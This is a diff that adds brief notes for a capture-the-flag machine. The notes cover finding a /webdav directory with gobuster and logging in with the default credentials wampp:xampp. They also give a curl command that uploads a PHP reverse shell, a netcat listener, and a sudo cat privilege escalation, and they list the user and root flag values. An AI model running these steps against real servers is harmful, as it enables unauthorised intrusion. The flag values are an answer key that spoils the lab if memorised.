@@ -1,0 +1,16 @@
+#Found directory /webdav using gobuster with common.txt
+#Use default credentials101101ddc16b0cdf65ba0b8a7af7afa5
+->wampp:xampp
+
+#Upload reverse shell
+->`curl http://<Machine IP>/webdav/shell.php -u wampp:xampp --upload-file shell.php`
+->listen on netcat `nc -nvlp <PORT>`
+->Note: user www-data can run cat as sudo
+
+#User Flag
+->located at /home/merlin
+->flag: 449b40fe93f78a938523b7e4dcd66d2a
+
+#Root Flag
+->located at /root
+->flag: 101101ddc16b0cdf65ba0b8a7af7afa5
